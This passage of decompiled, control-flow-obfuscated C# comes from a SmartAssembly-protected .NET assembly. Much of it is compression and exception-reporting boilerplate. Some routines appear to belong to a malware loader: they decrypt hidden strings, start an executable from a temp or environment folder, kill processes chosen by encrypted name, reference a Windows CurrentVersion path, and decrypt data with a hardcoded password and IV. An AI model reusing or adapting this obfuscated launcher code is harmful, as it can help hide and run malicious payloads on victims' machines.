					executablePath = Application.get_ExecutablePath();
					goto IL_0083;
					IL_0083:
					num = 7;
					text4 = "ows\\CurrentV";
					goto IL_008c;
					IL_008c:
					num = 8;
					text5 = "" + Interaction.Environ(Class21.smethod_154("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_00af;
					IL_00af:
					num = 9;
					text6 = Class21.smethod_154("Rx4K5yj4QnSzaKx9pdBAPA==");
					goto IL_00bf;
					IL_00bf:
					num = 10;
					text7 = Interaction.Environ(Class21.smethod_154("rRhnphBugUiRcVlpVgLfjw=="));
					goto IL_00d4;
					IL_00d4:
					num = 11;
					Conversion.Int(3405);
					goto IL_00e3;
					IL_00e3:
					num = 12;
					if (Class21.smethod_63(text6))
					{
						break;
					}
					goto IL_00f0;
					IL_00f0:
					num = 13;
					Conversion.Int(3405);
					goto IL_00ff;
					IL_00ff:
					num = 14;
					Process.Start(text7 + "\\" + text6 + ".exe");
					goto IL_011c;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 413;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[SecurityPermission(SecurityAction.Demand, UnmanagedCode = true)]
	static void smethod_82(Class55 class55_0)
	{
		if (class55_0 != null)
		{
			Class55.class55_0 = class55_0;
			AppDomain.CurrentDomain.UnhandledException += class55_0.method_1;
			Application.add_ThreadException((ThreadExceptionEventHandler)class55_0.method_0);
		}
	}

	[DllImport("kernel32.dll")]
	internal static extern void GetSystemInfo(ref Class58.Struct25 struct25_0);

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_83(Form1 form1_0)
	{
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_0141: Expected O, but got Unknown
		//IL_0205: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Expected O, but got Unknown
		while (true)
		{
			form1_0.button_1 = new Button();
			while (true)
			{
				form1_0.button_0 = new Button();
				form1_0.control1_0 = new Control1();
				form1_0.class54_0 = new Class54();
				form1_0.control2_0 = new Control2();
				((Control)form1_0).SuspendLayout();
				((Control)form1_0.button_1).set_Anchor((AnchorStyles)10);
				((ButtonBase)form1_0.button_1).set_FlatStyle((FlatStyle)3);
				((Control)form1_0.button_1).set_Location(new Point(308, 188));
				((Control)form1_0.button_1).set_Name("quitButton");
				((Control)form1_0.button_1).set_Size(new Size(100, 24));
				((Control)form1_0.button_1).set_TabIndex(0);
				((Control)form1_0.button_1).set_Text("&Quit");
				((Control)form1_0.button_1).add_Click((EventHandler)form1_0.method_1);
				((Control)form1_0.button_0).set_Anchor((AnchorStyles)10);
				while (true)
				{
					((ButtonBase)form1_0.button_0).set_FlatStyle((FlatStyle)3);
					((Control)form1_0.button_0).set_Location(new Point(202, 188));
					((Control)form1_0.button_0).set_Name("continueButton");
					((Control)form1_0.button_0).set_Size(new Size(100, 24));
					while (true)
					{
						((Control)form1_0.button_0).set_TabIndex(1);
						((Control)form1_0.button_0).set_Text("&Continue");
						while (true)
						{
							((Control)form1_0.button_0).add_Click((EventHandler)form1_0.method_0);
							while (true)
							{
								((Control)form1_0.control1_0).set_BackColor(Color.FromArgb(36, 96, 179));
								((Control)form1_0.control1_0).set_Dock((DockStyle)1);
								((Control)form1_0.control1_0).set_ForeColor(Color.White);
								form1_0.control1_0.IconState = Enum5.const_2;
								if (T1fpLDgQ4dlcokqoGbL())
								{
									switch (3)
									{
									case 5:
										break;
									case 4:
									case 11:
										goto end_IL_0006;
									case 16:
										goto end_IL_00b0;
									case 9:
										goto end_IL_00cc;
									case 10:
										goto end_IL_00ea;
									case 0:
										goto end_IL_0136;
									case 3:
										form1_0.control1_0.Image = null;
										((Control)form1_0.control1_0).set_Location(new Point(0, 0));
										((Control)form1_0.control1_0).set_Name("headerControl1");
										((Control)form1_0.control1_0).set_Size(new Size(418, 58));
										((Control)form1_0.control1_0).set_TabIndex(7);
										goto case 14;
									case 14:
										((Control)form1_0.control1_0).set_TabStop(false);
										((Control)form1_0.control1_0).set_Text("%AppName% attempted to perform an operation not allowed by the security policy.");
										((Control)form1_0.class54_0).set_Anchor((AnchorStyles)13);
										goto case 13;
									case 13:
										((Label)form1_0.class54_0).set_FlatStyle((FlatStyle)3);
										goto default;
									default:
										((Control)form1_0.class54_0).set_Location(new Point(20, 72));
										((Control)form1_0.class54_0).set_Name("errorMessage");
										((Control)form1_0.class54_0).set_Size(new Size(382, 13));
										((Control)form1_0.class54_0).set_TabIndex(14);
										((Control)form1_0.class54_0).set_Text("errorMessage");
										goto case 7;
									case 7:
										((Label)form1_0.class54_0).set_UseMnemonic(false);
										goto case 2;
									case 2:
										((Control)form1_0.control2_0).set_Anchor((AnchorStyles)6);
										goto case 12;
									case 12:
									case 18:
										((Control)form1_0.control2_0).set_Cursor(Cursors.get_Hand());
										((Control)form1_0.control2_0).set_Location(new Point(6, 186));
										((Control)form1_0.control2_0).set_Name("poweredBy");
										((Control)form1_0.control2_0).set_Size(new Size(120, 32));
										((Control)form1_0.control2_0).set_TabIndex(15);
										((Control)form1_0.control2_0).set_TabStop(false);
										((Control)form1_0.control2_0).set_Text("poweredBy1");
										((Form)form1_0).set_AutoScaleBaseSize(new Size(5, 13));
										goto case 1;
									case 1:
										((Control)form1_0).set_BackColor(SystemColors.Window);
										goto case 17;
									case 17:
										((Form)form1_0).set_ClientSize(new Size(418, 224));
										((Form)form1_0).set_ControlBox(false);
										((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_0);
										((Control)form1_0).get_Controls().Add((Control)(object)form1_0.button_1);
										goto case 8;
									case 8:
										((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control1_0);
										((Control)form1_0).get_Controls().Add((Control)(object)form1_0.class54_0);
										((Control)form1_0).get_Controls().Add((Control)(object)form1_0.control2_0);
										((Form)form1_0).set_FormBorderStyle((FormBorderStyle)1);
										((Form)form1_0).set_MaximizeBox(false);
										((Form)form1_0).set_MinimizeBox(false);
										((Control)form1_0).set_Name("SecurityExceptionForm");
										((Form)form1_0).set_ShowInTaskbar(false);
										((Form)form1_0).set_StartPosition((FormStartPosition)1);
										goto IL_043b;
									case 15:
										goto IL_043b;
									case 19:
										return;
									}
									continue;
								}
								goto IL_043b;
								IL_043b:
								((Control)form1_0).set_Text("%AppName%");
								((Control)form1_0).ResumeLayout(false);
								return;
								continue;
								end_IL_0006:
								break;
							}
							continue;
							end_IL_00b0:
							break;
						}
						continue;
						end_IL_00cc:
						break;
					}
					continue;
					end_IL_00ea:
					break;
				}
				continue;
				end_IL_0136:
				break;
			}
		}
	}

	static void smethod_84(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_85(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class21.smethod_122(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static int smethod_86(byte[] byte_0, Class32.Class38 class38_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		while (true)
		{
			int num3 = num2;
			while (true)
			{
				IL_0100:
				int num4 = Class21.smethod_96(class38_0.class42_0, byte_0, num, num2);
				num += num4;
				class38_0.long_0 += num4;
				num2 -= num4;
				if (num2 != 0)
				{
					while (class38_0.int_0 != 30)
					{
						Class32.Class41 class41_ = class38_0.class41_0;
						bool bool_ = (class38_0.int_0 & 4) != 0;
						bool bool_2 = (class38_0.int_0 & 8) != 0;
						if (Class21.smethod_30(bool_, bool_2, class41_))
						{
							goto IL_0100;
						}
						if (class38_0.int_0 != 16)
						{
							if (class38_0.int_0 == 20)
							{
								if (T1fpLDgQ4dlcokqoGbL())
								{
									switch (5)
									{
									case 0:
										break;
									case 3:
									case 5:
									{
										for (int num5 = 8 + (-class38_0.class42_0.BitCount & 7); num5 > 0; num5 -= 10)
										{
											Class21.smethod_21(class38_0.class42_0, 2, 10);
										}
										class38_0.int_0 = 16;
										goto IL_0100;
									}
									case 7:
										goto IL_00ed;
									case 6:
										goto IL_00f8;
									default:
										goto IL_0100;
									case 2:
										goto end_IL_0100;
									}
									continue;
								}
								goto IL_0100;
							}
							if (class38_0.int_0 != 28)
							{
								goto IL_0100;
							}
							goto IL_00ed;
						}
						return num3 - num2;
						IL_00ed:
						Class21.smethod_129(class38_0.class42_0);
						goto IL_00f8;
						IL_00f8:
						class38_0.int_0 = 30;
						goto IL_0100;
					}
				}
				return num3 - num2;
				continue;
				end_IL_0100:
				break;
			}
		}
	}

	static bool smethod_87(int int_0, int int_1, Class32.Class39 class39_0)
	{
		class39_0.short_0[class39_0.int_1] = (short)int_0;
		int num = 5;
		if (Ht7G4Qg4FYYvPjn2sqY())
		{
			goto IL_001f;
		}
		goto IL_00bf;
		IL_00bf:
		switch (num)
		{
		case 5:
			break;
		case 0:
		case 1:
			goto IL_0064;
		default:
			goto IL_0094;
		case 2:
		case 3:
			goto IL_00e3;
		case 6:
			goto IL_00f9;
		}
		goto IL_001f;
		IL_001f:
		class39_0.byte_1[class39_0.int_1++] = (byte)(int_1 - 3);
		int num2 = Class21.smethod_89(class39_0, int_1 - 3);
		class39_0.class40_0.short_0[num2]++;
		goto IL_0064;
		IL_0064:
		if (num2 >= 265 && num2 < 285)
		{
			class39_0.int_2 += (num2 - 261) / 4;
		}
		int num3 = Class21.smethod_64(class39_0, int_0 - 1);
		goto IL_0094;
		IL_00e3:
		if (num3 >= 4)
		{
			class39_0.int_2 += num3 / 2 - 1;
		}
		goto IL_00f9;
		IL_00f9:
		return Class21.smethod_108(class39_0);
		IL_0094:
		class39_0.class40_1.short_0[num3]++;
		num = 2;
		if (T1fpLDgQ4dlcokqoGbL())
		{
			goto IL_00bf;
		}
		goto IL_00e3;
	}

	static void smethod_88(int int_0, int int_1, Class32.Class39 class39_0, bool bool_0, byte[] byte_0)
	{
		class39_0.class40_0.short_0[256]++;
		Class21.smethod_150(class39_0.class40_0);
		Class21.smethod_150(class39_0.class40_1);
		Class21.smethod_50(class39_0.class40_0, class39_0.class40_2);
		Class21.smethod_50(class39_0.class40_1, class39_0.class40_2);
		Class21.smethod_150(class39_0.class40_2);
		int num = 4;
		for (int num2 = 18; num2 > num; num2--)
		{
			if (class39_0.class40_2.byte_0[Class32.Class39.int_0[num2]] > 0)
			{
				num = num2 + 1;
			}
		}
		int num3 = 14 + num * 3 + Class21.smethod_162(class39_0.class40_2) + Class21.smethod_162(class39_0.class40_0) + Class21.smethod_162(class39_0.class40_1) + class39_0.int_2;
		int num4 = class39_0.int_2;
		for (int i = 0; i < 286; i++)
		{
			num4 += class39_0.class40_0.short_0[i] * Class32.Class39.byte_2[i];
		}
		for (int j = 0; j < 30; j++)
		{
			num4 += class39_0.class40_1.short_0[j] * Class32.Class39.byte_3[j];
		}
		if (num3 >= num4)
		{
			num3 = num4;
		}
		if (int_0 >= 0 && int_1 + 4 < num3 >> 3)
		{
			Class21.smethod_101(byte_0, class39_0, bool_0, int_0, int_1);
		}
		else if (num3 == num4)
		{
			Class21.smethod_21(class39_0.class42_0, 2 + (bool_0 ? 1 : 0), 3);
			Class32.Class39.Class40 class40_ = class39_0.class40_0;
			short[] short_ = Class32.Class39.short_1;
			byte[] byte_ = Class32.Class39.byte_2;
			Class21.smethod_137(short_, class40_, byte_);
			class40_ = class39_0.class40_1;
			short_ = Class32.Class39.short_2;
			byte_ = Class32.Class39.byte_3;
			Class21.smethod_137(short_, class40_, byte_);
			Class21.smethod_147(class39_0);
			Class21.smethod_116(class39_0);
		}
		else
		{
			Class21.smethod_21(class39_0.class42_0, 4 + (bool_0 ? 1 : 0), 3);
			Class21.smethod_71(class39_0, num);
			Class21.smethod_147(class39_0);
			Class21.smethod_116(class39_0);
		}
	}

	static int smethod_89(Class32.Class39 class39_0, int int_0)
	{
		if (int_0 != 255)
		{
			int num = 257;
			while (true)
			{
				if (int_0 >= 8)
				{
					num += 4;
					int num2 = 3;
					if (!Ht7G4Qg4FYYvPjn2sqY())
					{
					}
					while (true)
					{
						switch (num2)
						{
						default:
							num2 = 4;
							if (!Ht7G4Qg4FYYvPjn2sqY())
							{
							}
							continue;
						case 1:
						case 3:
							int_0 >>= 1;
							break;
						case 4:
							break;
						case 0:
						case 2:
							goto end_IL_0054;
						case 5:
							goto IL_0062;
						}
						break;
					}
					continue;
				}
				goto IL_0062;
				IL_0062:
				return num + int_0;
				continue;
				end_IL_0054:
				break;
			}
		}
		return 285;
	}

	[DllImport("kernel32.dll")]
	internal static extern short GetVersionEx(ref Class58.Struct24 struct24_0);

	static void smethod_90()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName("qJ1rx6zo0JWv6cXezCyOGQ== ");
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	static byte[] smethod_91(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class21.smethod_52(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class32.Stream0 stream = new Class32.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class21.smethod_112(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class21.smethod_56(stream);
			int num3 = Class21.smethod_56(stream);
			int num4 = Class21.smethod_56(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class21.smethod_112(stream);
			Class21.smethod_112(stream);
			Class21.smethod_112(stream);
			int num5 = Class21.smethod_112(stream);
			int num6 = Class21.smethod_56(stream);
			int num7 = Class21.smethod_56(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class32.Class33 class33_ = new Class32.Class33(array2);
			array = new byte[num5];
			Class21.smethod_17(0, array.Length, class33_, array);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class21.smethod_112(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class21.smethod_112(stream);
					num11 = Class21.smethod_112(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class32.Class33 class33_2 = new Class32.Class33(array3);
					Class21.smethod_17(i, num11, class33_2, array);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 171, 17, 63, 69, 23, 142, 27, 174 };
				byte[] byte_2 = new byte[8] { 64, 116, 139, 121, 64, 11, 118, 83 };
				using ICryptoTransform cryptoTransform = Class21.smethod_145(bool_0: true, byte_, byte_2);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class21.smethod_91(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class21.smethod_57(bool_0: true, byte_4, byte_5);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class21.smethod_91(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static int smethod_92(int int_0, string string_0, Font font_0, Graphics graphics_0)
	{
		try
		{
			return Class21.smethod_73(int_0, graphics_0, string_0, font_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class21.smethod_48(int_0, graphics_0, font_0, string_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static void smethod_93(Class32.Class35 class35_0, int int_0)
	{
		if (class35_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class35_0.byte_0[class35_0.int_0++] = (byte)int_0;
		class35_0.int_0 &= 32767;
	}

	static Type smethod_94(Class50 class50_0)
	{
		return class50_0.type_0;
	}

	static void smethod_95(Class32.Class36 class36_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int num2 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		int num7 = default(int);
		int num12 = default(int);
		int i = default(int);
		int num14 = default(int);
		while (true)
		{
			int[] array2 = new int[16];
			int num = 0;
			while (true)
			{
				if (num < byte_0.Length)
				{
					num2 = byte_0[num];
					goto IL_0013;
				}
				int num3 = 0;
				int num4 = 8;
				if (Ht7G4Qg4FYYvPjn2sqY())
				{
					goto IL_019c;
				}
				goto IL_0206;
				IL_00bc:
				array2[num5] = num3 + (1 << 16 - num5);
				goto IL_00cd;
				IL_0206:
				switch (num4)
				{
				case 3:
					break;
				case 12:
					goto IL_002d;
				case 7:
					goto IL_005a;
				case 1:
					goto IL_00bc;
				case 14:
					goto IL_00d3;
				case 11:
					class36_0.short_0 = new short[num6];
					num10 = 512;
					num11 = 15;
					goto IL_0134;
				case 5:
					goto IL_0196;
				case 9:
					goto IL_019c;
				case 2:
					num3 += array[num7] << 16 - num7;
					if (num7 < 10)
					{
						goto IL_01ce;
					}
					goto default;
				default:
				{
					int num8 = array2[num7] & 0x1FF80;
					int num9 = num3 & 0x1FF80;
					num6 += num9 - num8 >> 16 - num7;
					goto IL_01ce;
				}
				case 4:
				case 8:
					num6 = 512;
					num7 = 1;
					goto IL_01ac;
				case 0:
					continue;
				case 13:
					goto end_IL_024a;
					IL_01ce:
					num7++;
					goto IL_01ac;
					IL_01ac:
					if (num7 > 15)
					{
						goto case 11;
					}
					array2[num7] = num3;
					goto case 2;
				}
				goto IL_0013;
				IL_0134:
				if (num11 >= 10)
				{
					num12 = num3 & 0x1FF80;
					num3 -= array[num11] << 16 - num11;
					int num13 = num3 & 0x1FF80;
					i = num13;
					goto IL_0196;
				}
				num14 = 0;
				goto IL_00d3;
				IL_00d3:
				if (num14 < byte_0.Length)
				{
					num5 = byte_0[num14];
					if (num5 != 0)
					{
						goto IL_005a;
					}
					goto IL_00cd;
				}
				return;
				IL_0196:
				for (; i < num12; i += 128)
				{
					class36_0.short_0[Class21.smethod_14(i)] = (short)((-num10 << 4) | num11);
					num10 += 1 << num11 - 9;
				}
				goto IL_019c;
				IL_019c:
				num11--;
				goto IL_0134;
				IL_002d:
				num++;
				continue;
				IL_005a:
				num3 = array2[num5];
				int num15 = Class21.smethod_14(num3);
				if (num5 > 9)
				{
					int num16 = class36_0.short_0[num15 & 0x1FF];
					int num17 = 1 << (num16 & 0xF);
					num16 = -(num16 >> 4);
					do
					{
						class36_0.short_0[num16 | (num15 >> 9)] = (short)((num14 << 4) | num5);
						num15 += 1 << num5;
					}
					while (num15 < num17);
					goto IL_00bc;
				}
				do
				{
					class36_0.short_0[num15] = (short)((num14 << 4) | num5);
					num15 += 1 << num5;
				}
				while (num15 < 512);
				num4 = 1;
				if (Ht7G4Qg4FYYvPjn2sqY())
				{
					continue;
				}
				goto IL_0206;
				IL_0013:
				if (num2 > 0)
				{
					array[num2]++;
				}
				goto IL_002d;
				IL_00cd:
				num14++;
				goto IL_00d3;
				continue;
				end_IL_024a:
				break;
			}
		}
	}

	static int smethod_96(Class32.Class42 class42_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class42_0.int_2 < 8)
		{
			goto IL_0076;
		}
		while (true)
		{
			class42_0.byte_0[class42_0.int_1++] = (byte)class42_0.uint_0;
			class42_0.uint_0 >>= 8;
			if (T1fpLDgQ4dlcokqoGbL())
			{
				switch (5)
				{
				case 0:
				case 3:
					break;
				case 1:
				case 5:
					goto IL_0068;
				default:
					goto IL_0095;
				case 4:
					goto IL_00b0;
				case 6:
					goto end_IL_0009;
				}
				continue;
			}
			break;
			continue;
			end_IL_0009:
			break;
		}
		goto IL_00db;
		IL_0095:
		Array.Copy(class42_0.byte_0, class42_0.int_0, byte_0, int_0, int_1);
		class42_0.int_0 = 0;
		goto IL_00b0;
		IL_00db:
		return int_1;
		IL_0068:
		class42_0.int_2 -= 8;
		goto IL_0076;
		IL_0076:
		if (int_1 > class42_0.int_1 - class42_0.int_0)
		{
			int_1 = class42_0.int_1 - class42_0.int_0;
			goto IL_0095;
		}
		Array.Copy(class42_0.byte_0, class42_0.int_0, byte_0, int_0, int_1);
		class42_0.int_0 += int_1;
		goto IL_00db;
		IL_00b0:
		class42_0.int_1 = 0;
		goto IL_00db;
	}

	static void smethod_97()
	{
		try
		{
			Class21.smethod_24();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_98(Class32.Class35 class35_0)
	{
		return class35_0.int_1;
	}

	static void smethod_99(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class21.smethod_125((object)string_1, eventArgs1_0.class46_0, string_0);
	}

	static bool smethod_100(byte[] byte_0, Class45.Class49 class49_0, Class45 class45_0)
	{
		while (true)
		{
			byte[] byte_;
			try
			{
				byte_ = Class21.smethod_46(byte_0);
			}
			catch (Exception)
			{
				Class21.smethod_75(class45_0, Enum4.const_0, Class32.string_0);
				return false;
			}
			byte[] array = Class21.smethod_110(byte_, "<RSAKeyValue><Modulus>8zj1hbahsEExLXne+3IPQdSWhOiHb+myYDUdqqZ4y8RonhGwzfILRmwZuBUwmaXgb7LcqPATZ5Q3lkFVO2UFLTjEDIMNShisPhioAauMeI3sO9BXdzMcDj5+GP/6XYgD6yNVZY+xM834VBMvw1ONqPXQA0W466HmsKxP+38W7Qc=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			while (true)
			{
				if (array != null)
				{
					Class21.smethod_11(class45_0, Enum4.const_1);
					Class57 @class = new Class57("d98c1dd4-008f-04b2-e980-0998ecf8427e");
					if (class45_0.iwebProxy_0 != null)
					{
						@class.iwebProxy_0 = class45_0.iwebProxy_0;
					}
					while (true)
					{
						Class45.Class47 class2 = new Class45.Class47(class45_0, array, @class, class49_0);
						if (Ht7G4Qg4FYYvPjn2sqY())
						{
							break;
						}
						switch (3)
						{
						case 0:
							break;
						default:
							continue;
						case 1:
							goto end_IL_0041;
						case 3:
						case 4:
							Class21.smethod_114((Delegate21)class2.method_0, @class);
							goto case 7;
						case 2:
						case 6:
							goto IL_00b9;
						case 7:
							return class2.bool_0;
						}
						goto end_IL_0080;
						continue;
						end_IL_0041:
						break;
					}
					continue;
				}
				Class21.smethod_75(class45_0, Enum4.const_0, Class44.string_0);
				goto IL_00b9;
				IL_00b9:
				return false;
				continue;
				end_IL_0080:
				break;
			}
		}
	}

	static void smethod_101(byte[] byte_0, Class32.Class39 class39_0, bool bool_0, int int_0, int int_1)
	{
		Class21.smethod_21(class39_0.class42_0, bool_0 ? 1 : 0, 3);
		if (!Ht7G4Qg4FYYvPjn2sqY())
		{
			switch (3)
			{
			case 0:
			case 3:
				Class21.smethod_129(class39_0.class42_0);
				goto case 1;
			case 1:
			case 2:
				Class21.smethod_79(int_1, class39_0.class42_0);
				Class21.smethod_79(~int_1, class39_0.class42_0);
				break;
			case 5:
				goto IL_0076;
			}
		}
		Class21.smethod_166(int_0, int_1, byte_0, class39_0.class42_0);
		goto IL_0076;
		IL_0076:
		Class21.smethod_116(class39_0);
	}

	static Bitmap smethod_102(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static byte[] smethod_103(Class46 class46_0)
	{
		return class46_0.method_4();
	}

	static void smethod_104(Exception exception_0, Class46 class46_0)
	{
		using (new Class59(class46_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class46_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class46_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class46_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class46_0.xmlWriter_0.WriteAttributeString("Method", text);
				class46_0.method_1(new Class50(exception_0, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static void smethod_105(byte[] byte_0, Class32.Class41 class41_0)
	{
		class41_0.byte_1 = byte_0;
		class41_0.int_7 = 0;
		class41_0.int_8 = byte_0.Length;
	}

	static void smethod_106(string string_0, string string_1)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly", writable: true);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\RedGate\\SmartAssembly");
			}
			registryKey.SetValue(string_0, string_1);
			registryKey.Close();
		}
		catch
		{
		}
	}

	static void smethod_107(Class32.Class39.Class40 class40_0, int[] int_0)
	{
		class40_0.byte_0 = new byte[class40_0.short_0.Length];
		int num9 = default(int);
		int num4 = default(int);
		int[] array = default(int[]);
		int num5 = default(int);
		int num6 = default(int);
		int num8 = default(int);
		int num7 = default(int);
		int num10 = default(int);
		int num11 = default(int);
		while (true)
		{
			IL_01d0:
			int num = int_0.Length / 2;
			int num2 = (num + 1) / 2;
			int num3 = 3;
			if (!T1fpLDgQ4dlcokqoGbL())
			{
				goto IL_0105;
			}
			goto IL_018e;
			IL_018e:
			while (true)
			{
				switch (num3)
				{
				case 6:
					break;
				case 1:
					goto IL_009c;
				case 4:
				case 9:
					goto IL_00a6;
				case 7:
					goto IL_00ae;
				default:
					goto IL_0105;
				case 8:
					num9 = num - 1;
					goto IL_0018;
				case 5:
					goto IL_011b;
				case 3:
				{
					num4 = 0;
					for (int i = 0; i < class40_0.int_3; i++)
					{
						class40_0.int_2[i] = 0;
					}
					array = new int[num];
					array[num - 1] = 0;
					goto case 8;
				}
				case 0:
				case 12:
					goto IL_01d0;
				case 2:
					class40_0.int_2[class40_0.int_3 - 1] += num4;
					class40_0.int_2[class40_0.int_3 - 2] -= num4;
					num5 = 2 * num2;
					num6 = class40_0.int_3;
					goto case 13;
				case 10:
					class40_0.byte_0[int_0[num8]] = (byte)num6;
					num7--;
					goto IL_0274;
				case 13:
					{
						if (num6 != 0)
						{
							num7 = class40_0.int_2[num6 - 1];
							goto IL_0274;
						}
						return;
					}
					IL_0274:
					while (num7 > 0)
					{
						num8 = 2 * int_0[num5++];
						if (int_0[num8 + 1] != -1)
						{
							continue;
						}
						goto case 10;
					}
					num6--;
					goto case 13;
				}
				break;
				IL_011b:
				num4 -= 1 << class40_0.int_3 - 1 - num10;
				if (num4 <= 0 || num10 >= class40_0.int_3 - 1)
				{
					if (num4 <= 0)
					{
						num3 = 2;
						if (!T1fpLDgQ4dlcokqoGbL())
						{
							break;
						}
						continue;
					}
					goto IL_002d;
				}
				goto IL_003d;
			}
			goto IL_001d;
			IL_001d:
			if (num4 != 0)
			{
				num10 = class40_0.int_3 - 1;
				goto IL_002d;
			}
			break;
			IL_009c:
			if (num11 > class40_0.int_3)
			{
				goto IL_00a6;
			}
			goto IL_00b2;
			IL_002d:
			while (class40_0.int_2[--num10] == 0)
			{
			}
			goto IL_003d;
			IL_003d:
			class40_0.int_2[num10]--;
			class40_0.int_2[++num10]++;
			num3 = 5;
			if (!T1fpLDgQ4dlcokqoGbL())
			{
				goto IL_00a6;
			}
			goto IL_018e;
			IL_00a6:
			num11 = class40_0.int_3;
			goto IL_00ae;
			IL_00ae:
			num4++;
			goto IL_00b2;
			IL_00b2:
			array[int_0[2 * num9]] = (array[int_0[2 * num9 + 1]] = num11);
			goto IL_0105;
			IL_0105:
			num9--;
			goto IL_0018;
			IL_0018:
			if (num9 < 0)
			{
				goto IL_001d;
			}
			if (int_0[2 * num9 + 1] != -1)
			{
				num11 = array[num9] + 1;
				goto IL_009c;
			}
			int num12 = array[num9];
			class40_0.int_2[num12 - 1]++;
			class40_0.byte_0[int_0[2 * num9]] = (byte)array[num9];
			goto IL_0105;
		}
	}

	static bool smethod_108(Class32.Class39 class39_0)
	{
		return class39_0.int_1 >= 16384;
	}

	static string smethod_109(string string_0)
	{
		string password = "nia";
		string s = "cffffffffffffffffff";
		string text = "SHA1";
		int num = 2;
		string s2 = "@1B2c3D4e5F6g7H8";
		int num2 = 256;
		byte[] bytes = Encoding.ASCII.GetBytes(s2);
		byte[] bytes2 = Encoding.ASCII.GetBytes(s);
		byte[] array = Convert.FromBase64String(string_0);
